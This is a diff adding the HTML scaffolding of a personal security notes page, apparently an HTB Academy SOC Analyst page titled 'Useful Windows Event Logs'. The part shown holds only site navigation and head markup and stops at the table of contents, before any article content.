@@ -1,0 +1,5183 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://miranda-bai.github.io/HTB/Academy/SOC%20Analyst/">
+      
+      
+        <link rel="prev" href="../Introduction%20to%20Web%20App/">
+      
+      
+        <link rel="next" href="../Web%20requests/">
+      
+      
+      <link rel="icon" href="../../../assets/logo.png">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.4">
+    
+    
+      
+        <title>Useful Windows Event Logs - Notes & Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.50c56a3b.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="light-blue" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#useful-windows-event-logs" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Notes &amp; Writeups" class="md-header__button md-logo" aria-label="Notes & Writeups" data-md-component="logo">
+      
+  <img src="../../../assets/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Notes & Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Useful Windows Event Logs
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Welcome
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Bug%20Bounty/Overlong%20UTF-8%20encoding%20attack/" class="md-tabs__link">
+          
+  
+  Bug Bounty
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../CISSP%20Pre/Glossaries/" class="md-tabs__link">
+          
+  
+  CISSP Pre
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../API%20attack/" class="md-tabs__link">
+          
+  
+  HTB
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Notes/Change%20Mysql%20pw%20in%20Linux/" class="md-tabs__link">
+          
+  
+  Notes
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../OffSec%20playground/CVE-2024-25180/" class="md-tabs__link">
+          
+  
+  OffSec playground
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Others/Bastion/" class="md-tabs__link">
+          
+  
+  Others
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../PortSwigger%20Labs/Access%20control%20vulnerabilities/" class="md-tabs__link">
+          
+  
+  PortSwigger Labs
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Notes &amp; Writeups" class="md-nav__button md-logo" aria-label="Notes & Writeups" data-md-component="logo">
+      
+  <img src="../../../assets/logo.png" alt="logo">
+
+    </a>
+    Notes & Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Welcome
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Bug Bounty
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Bug Bounty
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Bug%20Bounty/Overlong%20UTF-8%20encoding%20attack/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Overlong UTF-8 Encoding Attack
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    CISSP Pre
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            CISSP Pre
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/Glossaries/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Glossaries
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/Question%20review/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Question Review
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    1 Security and Risk Management
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            1 Security and Risk Management
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Domain 1 Security and Risk Managment 16%
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 1 Security Governance Through Principles and Policies
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%202/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 2 Personnel Security and Risk Management Concepts
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%203/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 3 Business Continuity Planning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%204/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 4 Laws, Regulations, and Compliance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2 Asset Security
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            2 Asset Security
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/2-Asset%20Security/0-Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Domain 2 Asset Security 10%
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/2-Asset%20Security/Chapter%205/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 5 Protecting Security of Assets
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    3 Security Architecture and Engineering
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            3 Security Architecture and Engineering
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Domain 3 Security Architecture and Engineering 13%
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%2010/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 10 Physical Security Requirements
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%206/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 6 Cryptography and Symmetric Key Algorithms
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%207/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 7 PKI and Cryptographic Applications
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%208/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 8 Principles of Security Models, Design, and Capabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%209/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 9 Security Vulnerabilities, Threats, and Countermeasures
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    4 Communication and Network Security
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            4 Communication and Network Security
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/4-Communication%20and%20Network%20Security/0-Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Domain 4 Communication and Network Security 13%
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/4-Communication%20and%20Network%20Security/Chapter%2011/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 11 Secure Network Architecture and Components
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/4-Communication%20and%20Network%20Security/Chapter%2012/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 12 Secure Communications and Network Attacks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    5 Identity and Access Managment
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_7">
+            <span class="md-nav__icon md-icon"></span>
+            5 Identity and Access Managment
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/5-Identity%20and%20Access%20Managment/0-Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Domain 5 Identity and Access Management (IAM) 13%
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/5-Identity%20and%20Access%20Managment/Chapter%2013/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 13 Managing Identity and Authentication
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/5-Identity%20and%20Access%20Managment/Chapter%2014/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 14 Controlling and Monitoring Access
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_8" id="__nav_3_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    6 Security Assessment and Testing
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_8">
+            <span class="md-nav__icon md-icon"></span>
+            6 Security Assessment and Testing
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/6-Security%20Assessment%20and%20Testing/0-Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Domain 6 Security Assessment and Testing 12%
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/6-Security%20Assessment%20and%20Testing/Chapter%2015/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 15 Security Assessment and Testing
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_9" id="__nav_3_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    7 Security Operations
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_9">
+            <span class="md-nav__icon md-icon"></span>
+            7 Security Operations
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/7-Security%20Operations/0-Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Domain 7 Security Operations 13%
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/7-Security%20Operations/Chapter%2016/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 16 Managing Security Operations
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/7-Security%20Operations/Chapter%2017/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 17 Preventing and Responding to Incidents
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/7-Security%20Operations/Chapter%2018/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 18 Disaster Recovery Planning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/7-Security%20Operations/Chapter%2019/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 19 Investigations and Ethics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_10" id="__nav_3_10_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    8 Software Development Security
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_10">
+            <span class="md-nav__icon md-icon"></span>
+            8 Software Development Security
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/8-Software%20Development%20Security/0-Overview/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Domain 8 Software Development Security 10%
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/8-Software%20Development%20Security/Chapter%2020/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 20 Software Development Security
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CISSP%20Pre/8-Software%20Development%20Security/Chapter%2021/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 21 Malicious Code and Application Attacks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    HTB
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            HTB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Academy
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            Academy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../API%20attack/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    API attack
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Introduction%20to%20Web%20App/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Introduction to Web APPs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Useful Windows Event Logs
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Useful Windows Event Logs
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-windows-system-logs" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Windows System Logs
+    </span>
+  </a>
+  
+</li>
+      
